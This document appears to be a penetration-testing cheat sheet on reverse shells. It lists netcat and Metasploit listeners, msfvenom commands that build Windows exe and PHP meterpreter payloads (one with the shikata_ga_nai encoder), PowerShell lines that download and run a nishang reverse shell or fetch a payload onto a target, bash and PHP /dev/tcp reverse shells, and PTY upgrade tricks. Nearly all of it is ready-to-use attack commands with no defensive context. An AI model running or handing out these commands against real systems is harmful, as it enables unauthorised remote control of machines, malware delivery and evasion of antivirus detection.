# Reverse Shell

## Listeners
___

### NC
```
nc -lvnp 4444
```
### Metasploit
- Meterpreter listener
```
use exploit/multi/handler
set lhost 0.0.0.0
set lport 4444
set payload windows/(x64)/meterpreter/reverse_tcp
```

## Payload
___

### Windows
- Reverse shell with nishang Invoke-PowershellTcp
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.6.77.211 -Port 4444
```

- Upgrade shell to meterpreter session
```sh
# Generate Payload with msfvenom then serve it with SimpleHTTPServer
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o rshell.exe
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port
run
python -m SimpleHTTPServer 8000
```
- Download and execute payload on target machine
```powershell
powershell (New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')
```

### Metasploit
- Exe Payload
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local ip address> LPORT=<local listening port> -f exe > shell.exe
```

- PHP Payload
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<local ip address> LPORT=<local listening port> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
- Basic PHP command line to open a shell
```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4445 0>&1'");
```

- Bash command to open shell
```sh
bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
```

## Upgrading shell
___
- Upgrade shell to bash/pty

```sh
SHELL=/bin/bash script -q /dev/null
```
```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

## Links
___
### Guides
- 

### Writeups
- 